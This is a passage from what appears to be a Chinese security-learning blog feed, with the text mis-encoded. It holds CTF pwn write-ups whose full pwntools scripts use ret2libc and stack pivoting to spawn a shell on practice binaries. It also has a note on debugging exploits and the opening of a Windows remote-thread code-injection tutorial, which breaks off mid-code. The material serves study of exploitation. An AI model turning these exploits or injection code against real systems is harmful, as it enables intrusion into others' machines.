class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e = ELF(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line">libc_start_main_got = e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RET2LIBC &gt;_&lt;&#x27;</span>)</span><br><span class="line">payload1 = <span class="number">0x78</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x00000000004011e3</span>)+p64(libc_start_main_got)+p64(<span class="number">0x401060</span>)+p64(<span class="number">0x401090</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_main_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_main_addr)</span><br><span class="line">libcbase = libc_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">puts_addr = libcbase + libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x78</span>*<span class="string">b&#x27;a&#x27;</span> +p64(<span class="number">0x000000000040101a</span>)+p64(<span class="number">0x00000000004011e3</span>)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RET2LIBC &gt;_&lt;&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ ˆè¿ç§»">æ ˆè¿ç§»</h3><p>æ‰“å¼€taské¢˜ç›®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know Stack_Pivoting?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401221</span>     main            proc near               ; DATA XREF: _start+<span class="number">18</span>â†‘o</span><br><span class="line">.text:<span class="number">0000000000401221</span>     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401221</span> <span class="number">000</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401225</span> <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401226</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401229</span> <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040122</span>E <span class="number">008</span>                 call    init</span><br><span class="line">.text:<span class="number">0000000000401233</span> <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401238</span> <span class="number">008</span>                 call    vuln</span><br><span class="line">.text:<span class="number">000000000040123</span>D <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401242</span> <span class="number">008</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000401243</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000401243</span>     ; &#125; <span class="comment">// starts at 401221</span></span><br><span class="line">.text:<span class="number">0000000000401243</span>     main            endp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004011</span>DB     ; <span class="type">void</span> <span class="title function_">gadget</span><span class="params">()</span></span><br><span class="line">.text:00000000004011DB                     public gadget</span><br><span class="line">.text:00000000004011DB     gadget          proc near</span><br><span class="line">.text:00000000004011DB     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004011</span>DB <span class="number">000</span>                 endbr64</span><br><span class="line">.text:<span class="number">00000000004011</span>DF <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004011E0</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004011E3</span> <span class="number">008</span>                 pop     rdi</span><br><span class="line">.text:<span class="number">00000000004011E4</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">00000000004011E4</span>     gadget          endp</span><br><span class="line">.text:<span class="number">00000000004011E4</span></span><br><span class="line">.text:<span class="number">00000000004011E4</span>     ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004011E5</span>                     align <span class="number">2</span></span><br><span class="line">.text:<span class="number">00000000004011E6</span>                     pop     rbp</span><br><span class="line">.text:<span class="number">00000000004011E7</span>                     retn</span><br><span class="line">.text:<span class="number">00000000004011E7</span>     ; &#125; <span class="comment">// starts at 4011DB</span></span><br></pre></td></tr></table></figure><p>ä¾ç„¶æ²¡æœ‰bin/shå’Œsystemï¼Œæ‰€ä»¥ä¾ç„¶éœ€è¦ret2libc</p><p>ä½†æ˜¯è§‚å¯Ÿreadå‡½æ•°å¯ä»¥å‘ç°ï¼Œå¯ä»¥å†™å…¥0x50ï¼Œæ•°ç»„é•¿åº¦0x40ï¼Œæ‰€ä»¥åªèƒ½å†™å…¥2ä¸ªåœ°å€å»è¦†ç›–ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯ä¸å¤Ÿçš„ï¼Œ<br>ç„¶åçœ‹çœ‹æœ‰æ²¡æœ‰å¯èƒ½ä¿®æ”¹0x50è¿™ä¸ªæ•°ï¼Œå‘ç°æ²¡æœ‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary stack_pivoting --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004011e3 : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br></pre></td></tr></table></figure><p>å¦‚æœæŒ‰ä¸Šä¸€ä¸ªé¢˜(ret2libc)ä¸¤æ¬¡åˆ†åˆ«éœ€è¦å†™å…¥ï¼š</p><p>pop_rdi+libcåœ°å€+putsåœ°å€+startåœ°å€<br>pop_rdi+bin/shåœ°å€+systemåœ°å€</p><p>å¯¹äº16å­—èŠ‚ï¼Œè¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥ä¸å¦¨æ¢ä¸ªæ€è·¯ï¼Œå¦‚æœå†™å…¥çš„å†…å®¹åŒºåŸŸä¸èƒ½æ”¹å˜ï¼Œé‚£è¦æ˜¯å¯ä»¥æ”¹å˜rspæŒ‡é’ˆä¹Ÿå¯ä»¥ï¼Œå¦‚æœç®—ä¸Šæ‰€æœ‰çš„ç©ºé—´ï¼Œæœ‰0x50ä¸ªï¼Œè¿™æ ·å°±å¤Ÿäº†ï¼Œåªè¦æƒ³åŠæ³•æŠŠrspæ”¾åˆ°è¿™ä¸ªç©ºé—´å¼€å¤´å°±å¥½äº†</p><p>èƒ½ä¿®æ”¹rspçš„æŒ‡ä»¤æ˜¯leave<br>æ•ˆæœæ˜¯ï¼šmov rspï¼Œrbpï¼›pop rbp</p><p>ä½†æ˜¯è¿™ä¸ªæŒ‡ä»¤åªèƒ½ä½¿å¾—rspæŒ‡å‘rbpæŒ‡å‘çš„åœ°å€ï¼Œå› æ­¤ï¼Œåœ¨æ ˆè¿ç§»ä¸­ï¼Œrbpå°±ç±»ä¼¼ä¸€ä¸ªå¼•å­ï¼Œé€šè¿‡ä¿®æ”¹rbpçš„å€¼é—´æ¥ä¿®æ”¹rspçš„å€¼ã€‚æ¯æ¬¡leaveä¹‹åï¼Œéƒ½ä¼špop rbpï¼Œä¸€å®šæ³¨æ„è¿™é‡Œpopå‡ºçš„åœ°å€å°±æ˜¯rspä¸‹æ¬¡çš„åœ°å€ã€‚å¯¹äºè¿™ä¸ªé¢˜ï¼Œæ¯æ¬¡å¯å†™çš„åŒºåŸŸæ˜¯rbpä¹‹ä¸Šçš„å†…å®¹(rbp-0x40)å’Œrbpä¸‹æ¬¡çš„åœ°å€å’Œretåœ°å€</p><p><img src="https://s2.loli.net/2025/01/04/TE8YqDnzmgLeG1O.png" alt="image-20250103235741084"></p><p>å¦‚æœè¿™æ ·å†™å…¥ï¼Œä¼šç›´æ¥è·³è¿‡ropé“¾(å› ä¸ºreadä¹‹åç›´æ¥leaveäº†)ç„¶årspå°±åˆ°ä¸‹é¢äº†ï¼Œè¿™æ ·æ— æ³•å®ç°æ‰§è¡Œçš„æ•ˆæœï¼Œä½†æ˜¯æ¯æ¬¡readä¹‹åå¿…ç„¶æ˜¯retï¼Œæ‰€ä»¥è¿™æ—¶éœ€è¦ä¸€ä¸ªæ–¹æ³•æŠŠrspæ”¾åˆ°ä¸Šé¢å»</p><p><img src="https://s2.loli.net/2025/01/04/6lG5YXwLsKqk9RT.png" alt="image-20250103235925955"></p><p>åˆšåˆšè¯´äº†ï¼Œrbpæ˜¯rspçš„å› å­ï¼Œæƒ³è¦ä¿®æ”¹rspå¿…é¡»å…ˆä¿®æ”¹rbpï¼Œç„¶åå†leaveï¼Œå› æ­¤å¯ä»¥é€šè¿‡å…ˆæŠŠrbpæ”¾åˆ°é“¾é¦–ç„¶åå†leaveçš„æ–¹å¼ä¿®æ”¹rspçš„å€¼</p><p><img src="https://s2.loli.net/2025/01/04/GPSFt8zlbeoc6XV.png" alt="image-20250104002905805"></p><p>æ‰§è¡Œleave_retä¹‹å</p><p><img src="https://s2.loli.net/2025/01/04/iIyVZDQMsn3vkHp.png" alt="image-20250104003447718"></p><p>leave_retè¿˜æœ‰ä¸€ä¸ªretï¼Œå¯ä»¥ç›´æ¥è§¦å‘ropé“¾</p><p>é‚£ä¹ˆï¼Œæµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><p>æ ˆè¿ç§»+è§¦å‘ç¬¬ä¸€æ¬¡çš„ropé“¾+æ ˆè¿ç§»+è§¦å‘ç¬¬äºŒæ¬¡rop</p><p>æ³¨æ„ï¼šåœ¨systemå‡½æ•°ä¸­rspå€¼ä¼šå‡0x338ï¼Œè¦ç•™å¤Ÿç©ºé—´ï¼Œå®é™…ç»™äº†0x800ã€‚readå‡½æ•°è¯»å–å€¼æ—¶å‚æ•°åœ¨æ ˆä¸Šï¼Œä¸èƒ½è¢«è¦†ç›–ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡ç»™å€¼åéœ€è¦æŠŠä¸‹æ¬¡çš„rbpæ”¾åˆ°æ›´åé¢çš„ä½ç½®(å€¼æ›´å¤§)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">name = <span class="string">&quot;./stack_pivoting&quot;</span></span><br><span class="line"></span><br><span class="line">new_rbp = <span class="number">0x4040A0</span>+<span class="number">0x800</span> <span class="comment">#åˆ†é…è¶³å¤Ÿå¤§çš„ç©ºé—´</span></span><br><span class="line">e = ELF(name)</span><br><span class="line">pPop_rdi = p64(<span class="number">0x4011E3</span>)</span><br><span class="line">pStart = p64(e.symbols[<span class="string">&#x27;_start&#x27;</span>])</span><br><span class="line">pRet = p64(<span class="number">0x4011E4</span>)</span><br><span class="line">pLeave_ret = p64(<span class="number">0x40121F</span>)</span><br><span class="line">pDataBef = p64(new_rbp-<span class="number">0x40</span>)</span><br><span class="line">pData = p64(new_rbp)</span><br><span class="line">pDataNext = p64(new_rbp+<span class="number">0x40</span>)</span><br><span class="line">pReadbuf = p64(<span class="number">0x401203</span>)</span><br><span class="line">pPuts = p64(<span class="number">0x401064</span>)</span><br><span class="line">libc_start_main_got = e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(name)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Do you know Stack_Pivoting?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å½“rbpä¿®æ”¹å,ä½¿ç”¨</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendRop1</span>(<span class="params">p,rop</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rop)!=<span class="number">0x38</span>:<span class="comment">#æœ€å‰é¢ç•™rbpè¿”å›åˆ°å¼€å§‹çš„é‚£ä¸ªåœ°å€</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len_not_right&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    rop = pDataNext + rop + pDataBef + pLeave_ret</span><br><span class="line">    p.send(rop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendRop2</span>(<span class="params">p,rop</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rop)!=<span class="number">0x38</span>:<span class="comment">#æœ€å‰é¢ç•™rbpè¿”å›åˆ°å¼€å§‹çš„é‚£ä¸ªåœ°å€</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len_not_right&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    rop = pDataNext + rop + pData + pLeave_ret</span><br><span class="line">    p.send(rop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x40</span>)+pData+pReadbuf</span><br><span class="line">p.send(payload1) <span class="comment">#ä¿®æ”¹rbp</span></span><br><span class="line"></span><br><span class="line">payload2 = pPop_rdi+p64(libc_start_main_got)+pPuts+pRet+pReadbuf+cyclic(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sendRop1(p,payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_main_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_main_addr)</span><br><span class="line">libcbase = libc_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">puts_addr = libcbase + libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = pPop_rdi + p64(binsh_addr) +pRet+p64(system_addr)+cyclic(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendRop2(p,payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> pwn </category>
          
          <category> æ ˆæº¢å‡º </category>
          
          <category> ret2libc </category>
          
          <category> æ ˆè¿ç§» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> æ ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA-vscode-wslè”åˆè°ƒè¯•pwné¢˜çš„expè„šæœ¬</title>
      <link href="/posts/ac1dbd3e.html"/>
      <url>/posts/ac1dbd3e.html</url>
      
        <content type="html"><![CDATA[<h2 id="èµ·å› ">èµ·å› </h2><p>ä½œä¸ºåªä¼šç”¨IDAè°ƒè¯•çš„å°Š(fei)è´µ(wu)REæ‰‹ï¼Œè°ƒpwnçš„expç”¨gdbå®åœ¨ç”¨ä¸æ¥QAQï¼Œæ‰€ä»¥æƒ³äº†ä¸ªåŠæ³•</p><h2 id="ç¯å¢ƒ">ç¯å¢ƒ</h2><ul><li>wsl2-Ubuntu</li><li>IDA8.3</li><li>vscodeåŠpythonæ’ä»¶</li><li>pwné¢˜å’Œå¯¹åº”çš„exp</li></ul><h2 id="æ­¥éª¤">æ­¥éª¤</h2><p>wslä¸­åœ¨é¢˜ç›®ç›®å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code .</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸»æœºæœ‰vscodeåº”è¯¥ä¼šè¢«å”¤é†’ï¼Œç„¶åæ‰§è¡Œwslçš„vscode serverçš„å®‰è£…ï¼Œå®‰è£…å®Œåï¼Œå¯ä»¥åœ¨wslä¸­ä½¿ç”¨vscode<br>ç„¶ååœ¨æ’ä»¶ä¸­å®‰è£…è°ƒè¯•pythonçš„æ’ä»¶</p><p>å°†idaserveræ”¾å…¥wslä¸­ï¼Œå¯åŠ¨</p><p>ç”¨wslä¸­çš„vscodeå¯åŠ¨è°ƒè¯•ï¼Œæ–­ç‚¹æ–­åœ¨<code>p = process(xxx)</code>ä¹‹å</p><p>idaé™„åŠ ï¼Œåœ¨è¿›ç¨‹åˆ—è¡¨ä¸­æ‰¾åˆ°å¯¹åº”çš„è¿›ç¨‹</p><p>ç„¶åæ„‰å¿«åœ°å¼€å§‹è°ƒè¯•ï¼Œæ³¨æ„ä¸¤è¾¹è¦ä¸€èµ·è°ƒ</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å®è·µ </category>
          
          <category> è®°å½• </category>
          
          <category> pwn </category>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è°ƒè¯• </tag>
            
            <tag> ida </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹09-ä»£ç æ³¨å…¥</title>
      <link href="/posts/37cfb00c.html"/>
      <url>/posts/37cfb00c.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä»£ç æ³¨å…¥">ä»£ç æ³¨å…¥</h2><p>ä¹‹å‰å­¦ä¹ äº†DLLæ³¨å…¥ï¼Œå®é™…ä¸Šè®©è¿›ç¨‹æ‰§è¡Œæˆ‘ä»¬è‡ªå·±çš„ä»£ç è¿˜æœ‰å¦ä¸€ç§æ–¹å¼ï¼Œå°±æ˜¯ä»£ç æ³¨å…¥ã€‚<br>é¡¾åæ€ä¹‰ï¼Œå°†ä»£ç æ³¨å…¥è¿›ç¨‹ï¼Œç„¶ååˆ›å»ºè¿œç¨‹çº¿ç¨‹å»æ‰§è¡Œã€‚</p><p>å’ŒDLLæ³¨å…¥çš„åŒºåˆ«å¾ˆæ˜æ˜¾ï¼šDLLæ³¨å…¥æ˜¯é€šè¿‡LoadLibraryè‡ªåŠ¨æ‰§è¡ŒDLLå†…çš„åˆå§‹åŒ–å‡½æ•°ä»è€Œå®ç°æ‰§è¡Œæˆ‘ä»¬çš„å‡½æ•°ï¼Œè€Œä»£ç æ³¨å…¥åˆ™æ˜¯ç›´æ¥ç”³è¯·ç©ºé—´å¹¶å†™å…¥å‡½æ•°æœºå™¨ç åŠå¯¹åº”ä¼ å‚ï¼Œæœ€åç”¨CreateRemoteThreadå°†å‡½æ•°é¦–åœ°å€å’Œä¼ å‚é¦–åœ°å€åšå‚æ•°æ¥æ‰§è¡Œã€‚</p><p>å…·ä½“æµç¨‹ï¼š</p><ul><li>è·å–ç›®æ ‡è¿›ç¨‹å¥æŸ„</li><li>å°†å‚æ•°æ‰“åŒ…ä¸ºç»“æ„ä½“</li><li>å°†ç»“æ„ä½“å†™å…¥ç›®æ ‡è¿›ç¨‹</li><li>å°†éœ€è¦æ‰§è¡Œçš„å‡½æ•°å†™å…¥ç›®æ ‡è¿›ç¨‹</li><li>åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œ</li></ul><blockquote><p>æŒ‰ä¹¦ä¸Šçš„ç›´æ¥å†™ç»“æœä¼šå´©æºƒï¼Œè°ƒè¯•äº†ä¸€ä¸‹å‘ç°å› ä¸ºæœ‰è·³è½¬è¡¨ä¹‹ç±»çš„ä¸œè¥¿ï¼Œæ‰€ä»¥åœ°å€ä¸å¯¹åº”<br>åœ¨é¡¹ç›®-å±æ€§-é“¾æ¥å™¨-å¢é‡é“¾æ¥-ç¦ç”¨å<br>é¡¹ç›®-å±æ€§-C/C+Â±ä»£ç ç”Ÿæˆ-å®‰å…¨æ£€æŸ¥-ç¦ç”¨<br>é¡¹ç›®-å±æ€§-C/C+Â±ä¼˜åŒ–-å†…è”å‡½æ•°æ‰©å±•-ç¦ç”¨<br>é¡¹ç›®-å±æ€§-C/C+Â±å¸¸è§„-æ”¯æŒä»…æˆ‘çš„ä»£ç è°ƒè¯•-ç¦ç”¨</p></blockquote><p>ä»¥ä¸Šå‡ ä¸ªç¦ç”¨åï¼Œå¯ä»¥åœ¨debugé…ç½®ä¸‹ç¼©å°ä»£ç è§„æ¨¡å’Œé˜²æ­¢å‡ºç°å¥‡æ€ªåœ°å€çš„è·³è½¬</p><p>åŒæ—¶ä¼¼ä¹å‡½æ•°ä½ç½®ä¸ä¸€å®šå’Œå†™ä»£ç çš„æ—¶å€™çš„ä½ç½®ä¸€æ ·ï¼Œæ‰€ä»¥è¦çœ‹ä¸€ä¸‹</p><p>ç„¶åæ˜¯å¯¼å…¥è¡¨çš„é—®é¢˜ï¼Œå¦‚æœæ˜¯ç›´æ¥ä½¿ç”¨åº“å‡½æ•°ï¼Œä¼šç›´æ¥è·³è½¬åˆ°å¯¼å…¥è¡¨æ¡ç›®ï¼Œæ‰€ä»¥ä¸èƒ½åœ¨ä»£ç ä¸­ç›´æ¥ä½¿ç”¨åº“å‡½æ•°ï¼Œå¿…é¡»å–å¾—åä¼ åœ°å€è¿‡å»ã€‚</p><h2 id="å®è·µC">å®è·µC</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Data</span> &#123;</span><br><span class="line">DWORD64 pLoadLibraryA;</span><br><span class="line">DWORD64 pGetProcAddress;</span><br><span class="line">DWORD64 pMassage;</span><br><span class="line">&#125;data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID <span class="title">writeMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID pReadyToWrite,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPVOID pMassage = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!pMassage)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;ç”³è¯·å†…å­˜å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> bytewritten;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pMassage, pReadyToWrite, size, &amp;bytewritten);</span><br><span class="line"><span class="keyword">if</span> (bytewritten != size)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;å†™å…¥å­—èŠ‚å¤±è´¥&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;[+] å†™å…¥æˆåŠŸ&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pMassage;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">code</span><span 